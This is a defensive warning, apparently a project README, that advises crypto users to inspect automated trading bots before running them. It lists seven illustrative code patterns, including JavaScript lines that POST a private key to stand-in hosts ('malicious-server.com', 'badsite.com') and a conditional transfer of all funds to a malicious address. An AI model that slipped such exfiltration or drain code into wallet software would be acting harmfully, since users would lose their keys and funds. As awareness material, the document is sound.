⚠️ WARNING ⚠️

Do not run bots from unknown sources If you are offered an Automatic Bot, Always Check the File Contents 
To avoid wallet designers or private keys being leaked 

Example of dangerous file contents


### 1. Sending Private Keys or Seed Phrases to External Servers

```js
axios.post('http://malicious-server.com/steal', { privateKey: PRIVATE_KEY });
```

* **Risk:** Private keys or seed phrases are sent in plain text to unknown servers.
* **Impact:** Attackers gain full access to your wallet and can drain funds instantly.

---

### 2. Storing Private Keys in Plain Files

```js
fs.writeFileSync('privatekey.txt', PRIVATE_KEY);
```

* **Risk:** Private keys stored in unsecured files can be accessed by malware or unauthorized users.
* **Impact:** Wallet security is compromised if the device is hacked or shared.

---

### 3. Using Untrusted RPC Providers or APIs

```js
const provider = new ethers.providers.JsonRpcProvider('https://malicious-node.com');
```

* **Risk:** Connecting to malicious or compromised nodes can lead to transaction manipulation.
* **Impact:** Funds can be redirected or stolen without your knowledge.

---

### 4. Collecting Private Keys via Input and Sending to Unknown URLs

```js
const PRIVATE_KEY = readlineSync.question('Enter your private key: ');
fetch('http://badsite.com/steal', { method: 'POST', body: PRIVATE_KEY });
```

* **Risk:** User inputs are exfiltrated to attacker-controlled endpoints.
* **Impact:** Even manual entry can lead to immediate compromise.

---

### 5. Using Unverified Third-Party Libraries or Modules

```js
import maliciousModule from 'some-unknown-lib';
maliciousModule.stealPrivateKey(PRIVATE_KEY);
```

* **Risk:** Hidden malicious code inside dependencies can leak sensitive data.
* **Impact:** Wallets compromised silently via dependencies.

---

### 6. Automatically Signing and Sending Transactions Without Validation

```js
wallet.signTransaction(tx).then(signedTx => {
  provider.sendTransaction(signedTx);
});
```

* **Risk:** Scripts that auto-sign transactions without checks can be abused to send all funds to attacker wallets.
* **Impact:** Wallet drained automatically.

---

### 7. Hidden Backdoors Triggering Unauthorized Transfers

```js
if (someCondition) {
  transferAllFundsTo('0xMaliciousAddress');
}
```

* **Risk:** Conditional logic that triggers fund transfers without user consent.
* **Impact:** Sudden loss of funds without clear cause.

---

## Best Practices to Protect Your Wallet

* **Never expose your private key or seed phrase in your code or to untrusted parties.**
* **Use environment variables or secure vault solutions to handle sensitive data.**
* **Audit open-source code and dependencies before use.**
* **Prefer hardware wallets for better security.**
